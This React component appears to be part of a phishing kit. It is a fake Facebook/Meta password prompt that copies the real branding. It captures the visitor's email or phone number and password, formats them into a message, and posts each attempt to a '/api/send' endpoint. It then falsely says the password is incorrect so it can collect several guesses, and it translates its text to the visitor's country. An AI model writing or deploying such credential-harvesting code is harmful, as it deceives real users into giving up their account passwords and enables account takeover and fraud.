import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { faCircleExclamation } from '@fortawesome/free-solid-svg-icons/faCircleExclamation';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { type FC, useEffect, useState } from 'react';

const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [identifier, setIdentifier] = useState('');
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, messageContent, setMessageContent } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['For your security, you must enter your password to continue.', 'Mobile number or email address', 'Password', "The password that you've entered is incorrect.", 'Continue', 'Forgot your password?'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        if (!identifier.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const identifierLine = `<b>👤 Account:</b> <code>${identifier}</code>`;
        const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
        const combined = `${identifierLine}\n${passwordLine}`;

        const updatedMessage = messageContent ? `${messageContent}\n\n${combined}` : combined;

        setMessageContent(updatedMessage);

        try {
            await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });
        } catch (err) {
            console.error('err send:', err);
        }

        if (config.PASSWORD_LOADING_TIME) {
            await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
        }

        if (next >= maxPass) {
            nextStep();
        } else {
            setShowError(true);
            setPassword('');
        }

        setIsLoading(false);
    };

    const renderForm = () => (
        <>
            <p className='text-center text-[15px] text-gray-600'>{t('For your security, you must enter your password to continue.')}</p>

            <div className='relative'>
                <input
                    type='text'
                    id='identifier-input'
                    value={identifier}
                    onChange={(e) => {
                        setIdentifier(e.target.value);
                        setShowError(false);
                    }}
                    className='peer h-15.5 w-full rounded-2xl border border-[#dde2e8] bg-white px-4 py-4 pb-1 placeholder-transparent outline-none focus:border-[#5d6c7b]'
                    placeholder=' '
                    autoComplete='username'
                />
                <label htmlFor='identifier-input' className='pointer-events-none absolute top-1/2 left-0 -translate-y-6 px-4 text-[13px] text-[#5d6c7b] transition-all select-none peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px]'>
                    {t('Mobile number or email address')}
                </label>
            </div>

            <div className='relative'>
                <input
                    type={showPassword ? 'text' : 'password'}
                    id='password-input'
                    value={password}
                    onChange={(e) => {
                        setPassword(e.target.value);
                        setShowError(false);
                    }}
                    className={`peer h-15.5 w-full rounded-2xl border bg-white px-4 py-4 pb-1 placeholder-transparent outline-none focus:border-[#5d6c7b] ${showError ? 'border-red-500' : 'border-[#dde2e8]'}`}
                    placeholder=' '
                />
                <label htmlFor='password-input' className={`pointer-events-none absolute top-1/2 left-0 -translate-y-6 px-4 text-[13px] transition-all select-none peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px] ${showError ? 'text-red-500' : 'text-[#5d6c7b]'}`}>
                    {t('Password')}
                </label>
                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-4 -translate-y-1/2 cursor-pointer text-gray-500 select-none' onClick={togglePassword} />
            </div>

            {showError && (
                <p className='flex items-center gap-1 text-[14px] text-red-600'>
                    <FontAwesomeIcon icon={faCircleExclamation} className='h-4 w-4' />
                    <span>{t("The password that you've entered is incorrect.")}</span>
                </p>
            )}

            <button onClick={handleSubmit} disabled={isLoading || !identifier.trim() || !password.trim()} className={`flex h-11 w-full items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7] ${isLoading || !identifier.trim() || !password.trim() ? 'cursor-not-allowed opacity-60' : ''}`}>
                {isLoading ? <div className='mx-auto h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent'></div> : t('Continue')}
            </button>

            <span className='block text-center text-[15px] font-medium text-[#0a1317]'>{t('Forgot your password?')}</span>
        </>
    );

    return (
        <>
            <div className='fixed inset-0 z-10 flex h-screen w-screen flex-col items-center overflow-y-auto bg-linear-to-b from-[#f7f8fa] via-[#f2f4f7] to-[#e9edf3] px-4 pt-5 md:hidden'>
                <p className='mt-2 text-sm text-[#5d6c7b]'>English (UK)</p>

                <div className='flex grow items-center justify-center'>
                    <Image src={FacebookLogoImage} alt='' className='h-15 w-15' />
                </div>

                <div className='flex w-full grow flex-col gap-3'>{renderForm()}</div>

                <footer className='flex w-full flex-col items-center justify-center gap-4 pb-4'>
                    <button className='flex h-11 w-full items-center justify-center rounded-[22px] border border-[#0064e0] text-[#0064e0]'>Create new account</button>
                    <Image src={MetaLogo} alt='' className='h-3 w-15 object-contain' />
                    <div className='flex items-center gap-2 text-[10px] text-[#63788a]'>
                        <span>About</span>
                        <span>Help</span>
                        <span>More</span>
                    </div>
                </footer>
            </div>

            <div className='fixed inset-0 z-10 hidden items-center justify-center bg-black/40 px-4 md:flex'>
                <div className='flex max-h-full w-full max-w-lg flex-col rounded-2xl bg-[linear-gradient(130deg,rgba(249,241,249,1)_0%,rgba(234,243,253,1)_35%,rgba(237,251,242,1)_100%)] px-5 py-5 shadow-lg'>
                    <div className='w-full space-y-4'>{renderForm()}</div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;
